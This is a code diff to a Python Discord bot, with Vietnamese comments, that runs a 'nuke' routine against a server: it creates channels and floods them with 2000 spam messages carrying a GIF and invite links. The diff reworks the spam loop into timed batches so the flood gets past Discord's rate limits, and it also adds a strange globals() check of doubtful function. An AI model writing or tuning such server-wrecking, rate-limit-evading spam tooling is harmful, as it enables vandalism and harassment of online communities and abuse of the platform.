@@ -196,17 +196,16 @@ class NukeConfirmView(discord.ui.View):
         
         for item in self.children:
             item.disabled = True
-        await interaction.message.edit(view=self)
+        await interaction.message.edit(view=view if 'view' in globals() else self)
         self.stop()
 
-        # Thực thi quy trình Nuke
         await execute_nuke(self.guild)
 
     @discord.ui.button(label="🔴 TỪ CHỐI", style=discord.ButtonStyle.red)
     async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         for item in self.children:
             item.disabled = True
-        await interaction.message.edit(view=self)
+        await interaction.message.edit(view=view if 'view' in globals() else self)
         await interaction.response.send_message(f"Bạn đã từ chối nuke sever {self.guild.name}", ephemeral=True)
         self.stop()
 
@@ -278,21 +277,23 @@ async def execute_nuke(guild):
             ' "|| link support 2 ||: https://discord.gg/hSdEUZD6Jp"'
         )
         
-        # Mỗi kênh sẽ spam đúng 20 tin nhắn để tổng số lượng đạt 2000 tin nhắn toàn server
-        spam_tasks = []
-        for channel in created_channels:
-            if isinstance(channel, discord.TextChannel):
-                async def spam_in_channel(ch=channel):
-                    for _ in range(20):
-                        try:
-                            embed = discord.Embed()
-                            embed.set_image(url=NUKE_GIF_URL)
-                            await ch.send(spam_content, embed=embed)
-                        except:
-                            break
-                spam_tasks.append(spam_in_channel())
-
-        await asyncio.gather(*spam_tasks, return_exceptions=True)
+        # Tối ưu hóa việc spam theo từng đợt để tránh bị Rate Limit (Lỗi dừng ở 700 tin)
+        valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
+        
+        for i in range(20): # 20 vòng lặp, mỗi vòng gửi 1 tin cho tất cả các kênh (Tổng 100 x 20 = 2000 tin)
+            batch_tasks = []
+            for channel in valid_channels:
+                async def send_msg(ch=channel):
+                    try:
+                        embed = discord.Embed()
+                        embed.set_image(url=NUKE_GIF_URL)
+                        await ch.send(spam_content, embed=embed)
+                    except:
+                        pass
+                batch_tasks.append(send_msg())
+            
+            await asyncio.gather(*batch_tasks, return_exceptions=True)
+            await asyncio.sleep(0.3) # Độ trễ chống nghẽn mạng / rate limit
 
         if log_channel:
             await log_channel.send(embed=discord.Embed(title="✅ Nuke siêu tốc (2000 tin nhắn) hoàn tất bởi Boss Bảo!", color=0x00FF00))
@@ -304,7 +305,6 @@ async def execute_nuke(guild):
 @bot.command(name="nuke")
 @is_bot_owner()
 async def nuke_server(ctx):
-    """Lệnh nuke server: Bot sẽ gửi thư DM đến Boss Bảo để hỏi xác nhận."""
     try:
         try:
             await ctx.message.delete()
